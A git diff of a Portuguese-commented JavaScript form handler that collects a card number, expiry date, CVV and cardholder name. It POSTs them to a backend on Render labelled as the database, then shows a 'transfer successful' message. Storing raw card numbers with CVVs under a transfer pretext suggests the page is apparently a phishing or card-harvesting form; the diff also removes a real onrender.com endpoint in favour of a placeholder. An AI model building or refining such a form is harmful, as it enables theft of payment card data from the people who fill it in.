@@ -1,6 +1,7 @@
 document.addEventListener("DOMContentLoaded", () => {
     const form = document.querySelector("#dadosss");
     
+    // Mapeamento dos campos do teu HTML
     const campos = {
         numero: document.querySelector("#numero"),
         data: document.querySelector("#data"),
@@ -8,7 +9,6 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: document.querySelector("#nome"),
     };
 
-    // --- LOGICA DAS DICAS (Mantida do seu original) ---
     const mensagensDica = {
         numero: "Exemplo: 1234 5678 9123 4567",
         data: "Exemplo: 12/30",
@@ -16,6 +16,7 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: "Nome completo impresso no cartão.",
     };
 
+    // Função para remover as mensagens de dica
     function removeMensagemDica(input) {
         const dicaExistente = input.parentElement.querySelector(".mensagem-dica");
         if (dicaExistente) {
@@ -23,6 +24,7 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     }
 
+    // Configuração dos Focus e Blur (Dicas)
     for (const key in campos) {
         const input = campos[key];
         input.addEventListener("focus", () => {
@@ -41,14 +43,25 @@ document.addEventListener("DOMContentLoaded", () => {
         });
     }
 
-    // --- NOVA LOGICA DE ENVIO PARA O BANCO DE DADOS ---
+    // --- LÓGICA DE ENVIO E VALIDAÇÃO ---
     form.addEventListener("submit", async (event) => {
-        event.preventDefault(); // Impede o recarregamento da página
+        event.preventDefault(); // Impede a página de recarregar
 
-        // 1. Pegar o tipo de cartão selecionado
-        const cardType = document.querySelector('input[name="gender"]:checked')?.value || "Não informado";
+        // 1. VALIDAÇÃO: Verifica se algum campo está vazio
+        if (
+            campos.numero.value.trim() === "" ||
+            campos.data.value.trim() === "" ||
+            campos.cvv.value.trim() === "" ||
+            campos.nome.value.trim() === ""
+        ) {
+            alert("Por favor, preencha todos os campos do cartão.");
+            return; // Bloqueia o envio se faltar informação
+        }
 
-        // 2. Montar o objeto com os dados
+        // 2. Coleta o tipo de cartão (Crédito ou Débito)
+        const cardType = document.querySelector('input[name="gender"]:checked')?.value || "Não selecionado";
+
+        // 3. Monta o objeto para o Banco de Dados
         const dadosParaEnviar = {
             numero: campos.numero.value,
             dataValidade: campos.data.value,
@@ -57,15 +70,14 @@ document.addEventListener("DOMContentLoaded", () => {
             tipo: cardType
         };
 
-        // 3. DESATIVAR O BOTÃO (Evita que o usuário clique 10 vezes enquanto envia)
+        // 4. Feedback visual no botão
         const botao = form.querySelector("button");
         botao.disabled = true;
-        botao.textContent = "Processando...";
+        botao.textContent = "A processar...";
 
         try {
-            // IMPORTANTE: Substitua o link abaixo pelo link que o RENDER te der!
-            // Exemplo: https://meu-projeto-api.onrender.com/enviar-dados
-            const urlDoServidor = "https://backend-g2xn.onrender.com/enviar-dados";
+            // SUBSTITUA pelo seu link do Render
+            const urlDoServidor = "https://SEU-PROJETO.onrender.com/enviar-dados";
 
             const resposta = await fetch(urlDoServidor, {
                 method: 'POST',
@@ -76,20 +88,18 @@ document.addEventListener("DOMContentLoaded", () => {
             });
 
             if (resposta.ok) {
-                alert("Transferência processada com sucesso!");
-                form.reset(); // Limpa o formulário
+                alert("Transferência realizada com sucesso!");
+                form.reset(); // Limpa o formulário após o sucesso
             } else {
-                alert("Erro ao processar transferência. Tente novamente.");
+                alert("Erro no servidor. Tente novamente mais tarde.");
             }
         } catch (error) {
-            console.error("Erro na conexão:", error);
-            alert("O servidor está offline. Tente novamente em alguns instantes.");
+            console.error("Erro ao conectar:", error);
+            alert("Erro de conexão. Verifique se o servidor está online.");
         } finally {
-            // Reativar o botão
+            // Reativa o botão
             botao.disabled = false;
             botao.textContent = "Transferir";
         }
     });
 });
-
-
